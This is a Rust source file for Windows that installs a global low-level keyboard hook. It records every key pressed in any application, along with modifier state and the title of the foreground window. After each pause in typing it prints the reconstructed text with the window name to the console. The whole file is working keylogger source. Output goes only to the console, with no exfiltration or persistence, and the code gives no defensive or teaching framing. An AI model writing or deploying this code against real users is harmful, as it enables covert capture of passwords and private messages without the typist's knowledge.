use std::{
  io::{stdout, Write},
  os::windows::prelude::OsStringExt,
  time::{Instant, Duration},
  sync::{Arc, Mutex},
  thread,
  ffi::{OsString},
  mem::{MaybeUninit},
  ptr, cmp::Ordering, fmt::format,
};

use lazy_static::lazy_static;

use winapi::{
  ctypes::{c_int},
  shared::{
    minwindef::{
      MAX_PATH, LPARAM, LRESULT, UINT, WPARAM
    },
  },
  um::{
    // libloaderapi::{
      //     GetModuleHandleW
      // },
      winuser::{
        HC_ACTION, WM_KEYDOWN, WM_SYSKEYDOWN, WH_KEYBOARD_LL, MAPVK_VK_TO_CHAR,
        KBDLLHOOKSTRUCT, ToAscii, // PKBDLLHOOKSTRUCT,
        GetKeyState,
        MapVirtualKeyExW, GetKeyNameTextW,
        CallNextHookEx, GetForegroundWindow, GetWindowTextW, HOOKPROC,
        SetWindowsHookExW, UnhookWindowsHookEx, TranslateMessage, DispatchMessageW,
        GetMessageW, MSG,
        VK_SPACE, VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CAPITAL, VK_BACK, VK_CONTROL
      },
    },
  };
  
  #[derive(Copy, Clone, Debug)]
  struct KeyInfo {
    vkCode: u32,
    scanCode: u32,
    cntrl: bool,
    shift: bool,
    caps: bool,
  }
  
  lazy_static! {
    static ref KEY_TIMER_START: Arc<Mutex<Option<Instant>>> = Arc::new(Mutex::new(None));
    static ref KEY_TIMER_LAST: Arc<Mutex<Option<Instant>>> = Arc::new(Mutex::new(None));
    // static ref KEY_STRING: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    // v preserve keycodes for future parsing
    static ref KEYCODES_VEC: Arc<Mutex<Vec<KeyInfo>>> = Arc::new(Mutex::new(Vec::new()));
    static ref WINDOW_STRING: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    
    static ref IGNORE_KEYS: Vec<i32> = vec![VK_SHIFT, VK_LSHIFT, VK_RSHIFT, VK_CAPITAL];
  }
  
  fn  name_from_keycode(key: KeyInfo) -> Option<String> {
    let char_code = unsafe { MapVirtualKeyExW(key.vkCode, MAPVK_VK_TO_CHAR, ptr::null_mut()) };
    match char_code {
      0 => None,
      _ => Some(String::from(char_code as u8 as char))
    }
  }
  
  fn name_from_scancode(key: KeyInfo) -> Option<String> {
    // Get the name of the key
    let mut sz_key_name = [0u16; 256];
    let i_result = unsafe { GetKeyNameTextW((key.scanCode as i32) << 16, sz_key_name.as_mut_ptr(), sz_key_name.len() as i32) };
    match i_result {
      0 => None,
      _ => Some(OsString::from_wide(&sz_key_name[..i_result as usize]).to_string_lossy().into_owned()) // Convert the wide-character string to a Rust string
    }
  }
  
  fn name_fg_window() -> String {
    let hwnd = unsafe { GetForegroundWindow() };
    let mut title = [0u16; MAX_PATH];
    let ret = unsafe { GetWindowTextW(hwnd, title.as_mut_ptr(), title.len() as c_int) };
    
    match ret.cmp(&0) {
      Ordering::Greater => String::from_utf16_lossy(&title[..ret as usize]),
      _ => String::from("<< WINDOW TITLE UNKOWN >>"),
    }
  }
  
  fn keycodes_to_string(kc_vec: Vec<KeyInfo>) -> String {
    kc_vec.iter().map(|kc| {
      if kc.vkCode == VK_SPACE as u32 {
        return String::from(VK_SPACE as u8 as char);
      } else if kc.vkCode == VK_BACK as u32 {
        return String::from(VK_BACK as u8 as char)
      }
      if let Some(key_name) = name_from_scancode(*kc) {
        if kc.shift {
          if let Some(key_name) = get_shift_key_name(*kc) {
            if kc.cntrl {
              return format!("Cntrl+{}", key_name);
            } 
            return key_name;
          }
        } else if !kc.caps {
          if kc.cntrl {
            return format!("Cntrl+{}", key_name);
          } 
          return key_name.to_lowercase();
        }
        
        if kc.cntrl {
          return format!("Cntrl+{}", key_name);
        } 
        return key_name;
      }
      return String::from("");
    }).collect::<String>()
  }
  
  fn control_enabled() -> bool {
    let CntrlKeyState = unsafe { GetKeyState(VK_CONTROL) };
    CntrlKeyState & -0x8000 != 0
  }
  
  fn shiftlock_enabled() -> bool {
    let ShiftKeyState = unsafe { GetKeyState(VK_SHIFT) };
    ShiftKeyState & -0x8000 != 0
  }
  
  fn capslock_enabled() -> bool {
    let CapsKeyState = unsafe { GetKeyState(VK_CAPITAL) };
    CapsKeyState & -0x0001 != 0
  }
  
  fn get_shift_key_name(key: KeyInfo) -> Option<String> {
    let mut szChar = [0u16; 2];
    let mut lpin = [0u8; 256];
    lpin[0x10] = 0x80;
    
    let iResult = unsafe { ToAscii(key.vkCode, key.scanCode, lpin.as_ptr(), szChar.as_mut_ptr(), 0) };
    if iResult == 0 {
      return None;
    }
    
    // Convert the wide-character string to an OsString
    Some(OsString::from_wide(&szChar[..iResult as usize]).to_string_lossy().into_owned())
  }
  
  unsafe extern "system" fn hook_callback(
    code: i32,
    wparam: WPARAM,
    lparam: LPARAM,
  ) -> LRESULT {
    
    if code == HC_ACTION {
      let p_keyboard = lparam as *const KBDLLHOOKSTRUCT;
      let key = KeyInfo {
        vkCode: (*p_keyboard).vkCode,
        scanCode: (*p_keyboard).scanCode,
        cntrl: control_enabled(),
        shift: shiftlock_enabled(),
        caps: capslock_enabled()
      };
      
      match wparam as UINT { 
        WM_KEYDOWN | WM_SYSKEYDOWN if !IGNORE_KEYS.contains(&(key.vkCode as i32)) => {
          // let mut KEY_STRING_LOCAL = Arc::clone(&KEY_STRING);
          let mut KEYCODES_VEC_ARC = Arc::clone(&KEYCODES_VEC);
          let KEYTIMERSTART = Arc::clone(&KEY_TIMER_START);
          let mut start_timer = KEYTIMERSTART.lock().unwrap();
          if start_timer.is_none() {
            *start_timer = Some(Instant::now());
          }
          drop(start_timer);
          
          let title = name_fg_window();
          // println!("================================");
          
          let key_name = name_from_keycode(key);
          if key_name.is_some() {
            KEYCODES_VEC_ARC.lock().unwrap().push(key);
            // KEY_STRING_LOCAL.lock().unwrap().push_str(&key_name);
          }
          
          // println!("Key code: {} || Key name: {}", key.vkCode, key_name.unwrap_or(String::from("unknown")));
          // println!("Caps: {} || Shift: {}", capslock_enabled(), shiftlock_enabled());
          // println!("Key down in window: {title}");
          let window_str_arc = Arc::clone(&WINDOW_STRING);
          let mut title_string = window_str_arc.lock().unwrap();
          title_string.clear();
          title_string.push_str(&title);
          drop(title_string);
          
          // println!("================================");
          let KEYTIMEREND = Arc::clone(&KEY_TIMER_LAST);
          let mut end_timer = KEYTIMEREND.lock().unwrap();
          *end_timer = Some(Instant::now());
          drop(end_timer);
          
          let t = thread::spawn(move || {
            thread::sleep(Duration::from_secs(1));
            let mut end_timer = KEYTIMEREND.lock().unwrap();
            
            if end_timer.is_some() && Instant::now().duration_since(end_timer.unwrap()) >= Duration::from_millis(900) {
              let mut start_timer = KEYTIMERSTART.lock().unwrap();
              // let mut update_string = KEY_STRING_LOCAL.lock().unwrap();
              let mut keycodes_vec = KEYCODES_VEC_ARC.lock().unwrap();
              let title_string = window_str_arc.lock().unwrap();
              
              print!("THE RECORDED WINDOW: ");
              stdout().flush();
              println!("{}", title_string);
              stdout().flush();
              print!("THE RECORDED STRING: ");
              stdout().flush();
              println!("{}", keycodes_to_string(keycodes_vec.to_vec()));
              stdout().flush();
              
              keycodes_vec.clear();
              *start_timer = None;
              *end_timer = None;
            };
          });
        },
        _ => (),
      }
    }
    
    CallNextHookEx(ptr::null_mut(), code, wparam, lparam)
  }

  fn main() {
    // let hinstance = unsafe { GetModuleHandleW(ptr::null()) };
    let hook_callback: HOOKPROC = Some(hook_callback);
    let hook = unsafe {
      SetWindowsHookExW(
        WH_KEYBOARD_LL,
        hook_callback,
        ptr::null_mut(), // hinstance
        0,
      )
    };
    
    if hook.is_null() {
      panic!("Failed to set keyboard hook");
    }
    
    let mut msg = MaybeUninit::<MSG>::uninit();
    
    loop {
      unsafe {
        let ret = GetMessageW(msg.as_mut_ptr(), ptr::null_mut(), 0, 0);
        
        if ret == 0 {
          break;
        } else if ret == -1 {
          panic!("GetMessageW failed");
        } else {
          TranslateMessage(msg.as_ptr());
          DispatchMessageW(msg.as_ptr());
        }
      }
      
    }
    
    unsafe {
      UnhookWindowsHookEx(hook);
    }
  }
  
  